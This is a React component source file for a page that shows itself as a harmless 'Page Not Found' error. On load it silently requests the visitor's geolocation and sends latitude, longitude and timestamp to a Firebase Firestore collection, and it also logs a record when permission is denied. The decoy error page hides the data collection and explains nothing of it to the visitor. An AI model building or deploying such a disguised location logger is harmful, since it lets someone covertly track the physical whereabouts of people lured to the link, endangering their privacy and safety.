import React, { Component } from "react";
import database from "./firebase";
import moment from "moment";
import "./App.css";

export default class App extends Component {
  constructor() {
    super();
    this.state = {
      latitude: "",
      longitude: "",
      dateAccess: moment().format("dddd, D MMMM YYYY, h:mm:ss a"),
    };
    this.getMyLocation = this.getMyLocation.bind(this);
    this.Push = this.Push.bind(this);
  }
  componentDidMount() {
    this.getMyLocation();
  }

  getMyLocation() {
    const location = window.navigator && window.navigator.geolocation;

    if (location) {
      location.getCurrentPosition(
        (position) => {
          this.setState(
            {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
            },
            () => this.Push()
          );
        },
        (error) => {
          this.setState(
            {
              latitude: "err-latitude",
              longitude: "err-longitude",
            },
            () => this.Push()
          );
        }
      );
    }
  }

  Push = () => {
    const db = database;
    db.collection("data").doc(moment().format("h:mm:ss, D MMMM YYYY")).set({
      date: this.state.dateAccess,
      lotitude: this.state.latitude,
      longitude: this.state.longitude,
    });
  };

  render() {
    return (
      <a href="" target="_blank">
        <header className="top-header"></header>

        <div>
          <div className="starsec"></div>
          <div className="starthird"></div>
          <div className="starfourth"></div>
          <div className="starfifth"></div>
        </div>

        <div className="lamp__wrap">
          <div className="lamp">
            <div className="cable"></div>
            <div className="cover"></div>
            <div className="in-cover">
              <div className="bulb"></div>
            </div>
            <div className="light"></div>
          </div>
        </div>
        <section className="error">
          <div className="error__content">
            <div className="error__message message">
              <h1 className="message__title">Page Not Found</h1>
              <p className="message__text">
                We're sorry, the page you were looking for isn't found here. The
                link you followed may either be broken or no longer exists.
                Please try again, or take a look at our.
              </p>
            </div>
          </div>
        </section>
      </a>
    );
  }
}
